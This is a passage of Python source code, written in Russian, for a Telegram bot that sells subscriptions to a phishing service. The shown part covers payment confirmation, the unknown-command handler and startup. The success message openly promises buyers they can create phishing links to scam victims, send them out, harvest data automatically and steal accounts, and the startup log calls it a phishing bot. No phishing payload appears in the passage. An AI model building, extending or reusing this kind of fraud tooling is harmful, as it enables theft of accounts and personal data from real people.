💎 Тип подписки: {subscription_names[subscription_type]}
⏱️ Действует до: {expiry_date}
🔗 Лимит ссылок: {SUBSCRIPTION_LIMITS[subscription_type]['links']}
⏳ Время жизни ссылок: {SUBSCRIPTION_LIMITS[subscription_type]['link_lifetime']}

🎉 Теперь вы можете:
1. Создавать фишинг-ссылки для скама мамонтов
2. Отправлять их жертвам
3. Собирать данные автоматически
4. Воровать аккаунты и данные

👇 Начните работу прямо сейчас!
""")
            
            markup = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="💎 Главное меню", callback_data="back_to_main")]
                ]
            )
            
            # Используем новую функцию для отправки фото
            await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                                      "photo1.png", success_text, markup)
            
            await callback_query.answer("✅ Оплата подтверждена! Подписка активирована.", show_alert=True)
        else:
            await callback_query.answer("❌ Оплата не найдена. Пожалуйста, оплатите счет или попробуйте позже.", show_alert=True)
    else:
        await callback_query.answer("❌ Счет не найден или истек. Создайте новый счет.", show_alert=True)

# --- ОБРАБОТЧИК НЕИЗВЕСТНЫХ КОМАНД ---

@dp.message()
async def handle_unknown(message: types.Message):
    unknown_text = format_bold_text("#@$%?&!... Похоже я вас не понял\nПопробуйте воспользоваться меню ниже или введите ❯❯❯ /start")
    await message.answer(unknown_text, parse_mode='HTML')

async def main():
    """Основная функция запуска бота"""
    # Проверяем существование необходимых файлов изображений
    required_images = ['photo1.png', 'photo3.png', 'photo8.png']
    
    logging.info("Проверка наличия файлов изображений...")
    for img in required_images:
        img_path = get_image_path(img)
        if os.path.exists(img_path):
            logging.info(f"✓ Файл {img} найден: {img_path}")
        else:
            logging.warning(f"✗ Файл {img} не найден: {img_path}")
    
    logging.info("Фишинг Бот запущен...")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
